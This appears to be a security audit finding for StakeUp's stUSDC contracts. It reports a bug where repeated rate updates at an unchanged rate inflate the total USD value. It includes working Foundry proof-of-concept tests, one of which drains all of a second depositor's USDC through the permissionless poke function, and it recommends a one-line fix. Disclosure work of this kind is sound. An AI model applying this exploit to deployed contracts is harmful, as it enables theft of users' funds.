# (HIGH) Artificial inflation of total USD value due to repeated _setUsdPerShare calls with the same rate

In StakeUp's protocol, the rate of USDC per share of stUSDC is updated in the internal [_setUsdPerShare](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L92-L109) function of the [StUsdcLite.sol](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol) contract. This function can be called both from the external [setUsdPerShare](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L53-L55) function, which only the protocol's keeper can trigger, and from the permissionless external [poke](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdc.sol#L164-L216) function, which resides in the [StUsdc.sol](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdc.sol) contract. Apart from updating the USDC per share rate, the [_setUsdPerShare](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L92-L109) function is also responsible for updating the total USD value held by the system, which occurs inside the internal [_totalUsd](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L74-L81) function of the [StUsdcLite.sol](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol).

If the [_setUsdPerShare](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L92-L109) function is called multiple times with the same rate, and with [_rewardPerSecond](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L28) already set, the total USD value will be artificially inflated, enabling users to withdraw more assets than they actually hold.

## Context

- [StUsdcLite.sol#L92-L109](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L92-L109)

## Impact

The total USD value held by the system will be artificially inflated, enabling users to withdraw more assets than their actual holdings.

## Proof of Concept

This issue occurs when the USD per share is updated repeatedly with the same rate, with [_rewardPerSecond](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L28) holding a non-zero value, through the [_setUsdPerShare](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L92-L109) function. Here's a snippet of the [_setUsdPerShare](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L92-L109) code:

```solidity
 92:    function _setUsdPerShare(uint256 usdPerShare, uint256 timestamp) internal {
 93:        // solidify the yield from the last 24 hours (stored as floor which will be used to update totalUsdFloor)
 94:        uint256 floor = _totalUsd();
 95:        _lastRateUpdate = timestamp;
 96:
 97:        uint256 lastUsdPerShare_ = _lastUsdPerShare;
 98:        if (usdPerShare > lastUsdPerShare_) {
 99:            uint256 yieldPerShare = usdPerShare - lastUsdPerShare_;
100:            _rewardPerSecond = yieldPerShare.divWad(Constants.ONE_DAY);
101:        } else if (usdPerShare < lastUsdPerShare_) {
102:            _rewardPerSecond = 0;
103:            floor = usdPerShare.mulWad(_totalShares);
104:        }
105:
106:        _setTotalUsdFloor(floor);
107:        _lastUsdPerShare = usdPerShare;
108:        emit UpdatedUsdPerShare(usdPerShare);
109:    }
```

As seen, the [_rewardPerSecond](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L28) is not reset to zero when `usdPerShare == lastUsdPerShare_`. As a result, the total USD is artificially inflated each time the floor value is retrieved by the [_totalUsd](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L74-L81) function. The total USD value is also updated at line 106. Here's a snippet of the [_totalUsd](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L74-L81) function:

```solidity
74:     function _totalUsd() internal view returns (uint256) {
75:         uint256 timeElapsed = block.timestamp - _lastRateUpdate;
76:         uint256 yieldPerShare = timeElapsed >= Constants.ONE_DAY
77:             ? (_rewardPerSecond.mulWad(Constants.ONE_DAY))
78:             : (_rewardPerSecond.mulWad(timeElapsed));
79:         uint256 yield = yieldPerShare.mulWad(_totalShares);
80:         return _totalUsdFloor + yield;
81:     }
```

The above function computes the total USD value held by the system, yield included. Since [_rewardPerSecond](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L28) is not reset, the value returned by the [_totalUsd](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L74-L81) will inflate over time, even though the USD per share remains the same.

This artificial inflation enables users to withdraw more assets than they hold. To demonstrate this, two Proofs of Concept are shown: one using the [setUsdPerShare](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L53-L55) function and the other using the [poke](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdc.sol#L164-L216) function.

Here's a complete Proof of Concept using the [setUsdPerShare](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L53-L55) function:

```solidity
function test_inflationBugThroughKeeper() public {
    // ************************ SETUP ************************
    // `alice` and `bob` deposit 1,000 USDC each
    uint256 depositAssetAmount = 1_000e6;
    _depositAsset(alice, depositAssetAmount);
    _depositAsset(bob, depositAssetAmount);
    assertEq(stUsdc.balanceOf(alice), depositAssetAmount * 1e12);
    assertEq(stUsdc.balanceOf(bob), depositAssetAmount * 1e12);

    // `borrower` match the order of the stUSDC contract
    uint256 matchAmount = 2 * depositAssetAmount;
    uint256 totalCollateral = _matchBloomOrder(address(stUsdc), matchAmount);
    vm.stopPrank();
    assertEq(bloomPool.matchedDepth(), matchAmount);

    // TBY starts its maturity period
    uint256 tbyId = _bloomStartNewTby(totalCollateral);
    vm.stopPrank();
    assertEq(tby.balanceOf(address(stUsdc), tbyId), matchAmount);

    // *********************** ACTION ************************
    // Simulation of price change over time
    address keeper_ = address(stUsdc.keeper());
    for (uint256 i; i < 5; ++i) {
        _skipAndUpdatePrice(1 days, 220e8, uint80(i));

        vm.prank(keeper_);
        stUsdc.setUsdPerShare(2e18, block.timestamp);
    }

    // ************************ TEST *************************
    // Asserting that `alice`'s stUSDC balance has been artificially inflated
    uint256 aliceStUsdcBalance = stUsdc.balanceOf(alice);
    assertGt(aliceStUsdcBalance, 4 * (depositAssetAmount * 1e12));
    console.log("ALICE stUSDC BALANCE   :", aliceStUsdcBalance);

    // Asserting that `bob`'s stUSDC balance has been artificially inflated
    uint256 bobStUsdcBalance = stUsdc.balanceOf(bob);
    assertGt(bobStUsdcBalance, 4 * (depositAssetAmount * 1e12));
    console.log("BOB stUSDC BALANCE     :", bobStUsdcBalance);
}
```

Logs:
```
ALICE stUSDC BALANCE   : 4999999999999999996000
BOB stUSDC BALANCE     : 4999999999999999996000
```

Here's a complete Proof of Concept using the [poke](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdc.sol#L164-L216) function:

```solidity
function test_inflationBugThroughPoke() public {
    // ************************ SETUP ************************
    // `alice` and `bob` deposit 1,000 USDC each
    uint256 depositAssetAmount = 1_000e6;
    _depositAsset(alice, depositAssetAmount);
    _depositAsset(bob, depositAssetAmount);
    assertEq(stUsdc.balanceOf(alice), depositAssetAmount * 1e12);
    assertEq(stUsdc.balanceOf(bob), depositAssetAmount * 1e12);

    // `borrower` match the order of the stUSDC contract
    uint256 matchAmount = 2 * depositAssetAmount;
    uint256 totalCollateral = _matchBloomOrder(address(stUsdc), matchAmount);
    vm.stopPrank();
    assertEq(bloomPool.matchedDepth(), matchAmount);

    // TBY starts its maturity period
    uint256 tbyId = _bloomStartNewTby(totalCollateral);
    vm.stopPrank();
    assertEq(tby.balanceOf(address(stUsdc), tbyId), matchAmount);

    // Simulation of price change over time until TBY's maturity is reached
    uint256 newPrice;
    for (uint256 i; i < 180; ++i) {
        if (i < 45) {
            newPrice = 110e8;
        } else if (i < 90) {
            newPrice = 250e8;
        } else if (i < 170) {
            newPrice = 175e8;
        } else {
            newPrice = 220e8;
        }

        vm.prank(rando);
        stUsdc.poke(_generateSettings(address(0)));

        _skipAndUpdatePrice(1 days, newPrice, uint80(i));
    }

    // Turning TBY redeemable
    _bloomEndTby(tbyId, 2 * totalCollateral);
    vm.stopPrank();
    assertTrue(bloomPool.isTbyRedeemable(tbyId));

    // Redemption of TBY
    vm.prank(rando);
    stUsdc.poke(_generateSettings(address(0)));
    assertEq(tby.balanceOf(address(stUsdc), tbyId), 0);

    // *********************** ACTION ************************
    // `alice` withdraws all USDC held in stUSDC contract (`bob`'s balance included)
    uint256 stUsdcBalance = stableToken.balanceOf(address(stUsdc));
    vm.startPrank(alice);
    stUsdc.redeemStUsdc(stUsdcBalance * 1e12);

    // ************************ TEST *************************
    // Asserting that `alice` withdraws all USDC from stUSDC contract
    uint256 aliceUsdcBalance = stableToken.balanceOf(alice);
    assertEq(aliceUsdcBalance, stUsdcBalance);
    console.log("ALICE USDC BALANCE     :", aliceUsdcBalance);

    // Asserting that the stUSDC contract no longer holds any USDC
    stUsdcBalance = stableToken.balanceOf(address(stUsdc));
    assertEq(stUsdcBalance, 0);
    console.log("stUSDC USDC BALANCE    :", stUsdcBalance);

    // Asserting that `bob` cannot get his USDC back
    vm.expectRevert(Errors.InsufficientBalance.selector);
    vm.startPrank(bob);
    stUsdc.redeemStUsdc(10e18);
    console.log("BOB USDC BALANCE       :", stableToken.balanceOf(bob));
}
```

Logs:
```
ALICE USDC BALANCE     : 3990000000
stUSDC USDC BALANCE    : 0
BOB USDC BALANCE       : 0
```

## Recommendation

Consider changing the else if condition at line 101 of the [StUsdcLite.sol](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol) contract as follows:

```solidity
101: (-)  else if (usdPerShare < lastUsdPerShare_)
101: (+)  else if (usdPerShare <= lastUsdPerShare_)
```

This will ensure that [_rewardPerSecond](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L28) is reset to zero if the USD per share is updated with the same rate.
